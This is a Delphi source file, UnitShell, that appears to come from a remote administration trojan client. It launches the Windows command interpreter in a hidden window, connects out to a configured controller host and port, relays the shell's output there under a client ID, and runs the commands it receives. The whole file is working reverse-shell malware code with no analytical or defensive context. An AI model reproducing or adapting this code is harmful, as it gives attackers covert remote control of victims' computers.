unit UnitShell;

interface

uses
  Windows, UnitVariables, UnitCommands, SocketUnitEx;

var
  ShellCmd: string;

procedure ShellThread;
	
implementation

procedure ShellThread;
var
  ClientSocket: TClientSocket;
  Buffer, ToSend: string;
  SecurityAttributes: SECURITY_ATTRIBUTES;
  hiRead, hiWrite, hoRead, hoWrite: THandle;
  StartupInfo: TStartupInfo;
  ProcessInfo: TProcessInformation;
  BytesRead, BytesWritten, ExitCode, PipeMode: DWORD;
  ComSpec: array[0..MAX_PATH] of Char;
begin                                 
  SetLength(Buffer, 32767);
  SecurityAttributes.nLength := SizeOf(SECURITY_ATTRIBUTES);
  SecurityAttributes.lpSecurityDescriptor := nil;
  SecurityAttributes.bInheritHandle := True;
  CreatePipe(hiRead, hiWrite, @SecurityAttributes, 0);
  CreatePipe(hoRead, hoWrite, @SecurityAttributes, 0);
  GetStartupInfo(StartupInfo);
  StartupInfo.hStdOutput := hoWrite;
  StartupInfo.hStdError := hoWrite;
  StartupInfo.hStdInput := hiRead;
  StartupInfo.dwFlags := STARTF_USESHOWWINDOW + STARTF_USESTDHANDLES;
  StartupInfo.wShowWindow := SW_HIDE;
  GetEnvironmentVariable('COMSPEC', ComSpec, sizeof(ComSpec));
  CreateProcess(nil, ComSpec, nil, nil, True, CREATE_NEW_CONSOLE, nil, nil, StartupInfo, ProcessInfo);
  CloseHandle(hoWrite);
  CloseHandle(hiRead);
  PipeMode := PIPE_NOWAIT;
  SetNamedPipeHandleState(hoRead, PipeMode , nil, nil);

  ClientSocket := TClientSocket.Create;
  ClientSocket.Connect(MainHost, MainPort);
  if ClientSocket.Connected = False then Exit;
  ClientSocket.SendDatas(SHELL + '|' + ClientId + '|' + SHELLSTART + '|');
  
  repeat
    Sleep(10);
    GetExitCodeProcess(ProcessInfo.hProcess, ExitCode);
    if ExitCode <> STILL_ACTIVE then Break;
    ReadFile(hoRead, Pointer(Buffer)^, 32767, BytesRead, nil);
    if BytesRead > 0 then
    begin
      ToSend := Copy(Buffer, 1, BytesRead);
      OemToAnsi(PChar(ToSend), PChar(ToSend));
      if ClientSocket.SendDatas(SHELL + '|' + ClientId + '|' + SHELLDATAS + '|' + ToSend) = -1 then Break;
    end;

    if ShellCmd <> '' then
    begin
      WriteFile(hiWrite, Pointer(ShellCmd)^, Length(ShellCmd), BytesWritten, nil);
      WriteFile(hiWrite, #13#10, 2, BytesWritten, nil);
      ShellCmd := '';
    end;
  until False;

  GetExitCodeProcess(ProcessInfo.hProcess, ExitCode);
  if ExitCode = STILL_ACTIVE then TerminateProcess(ProcessInfo.hProcess, 0);
  CloseHandle(hoRead);
  CloseHandle(hiWrite);

  ClientSocket.SendDatas(SHELL + '|' + ClientId + '|' + SHELLSTOP + '|');
  ClientSocket.Disconnect;
  ClientSocket.Free;
  ClientSocket := nil;
end;

end.
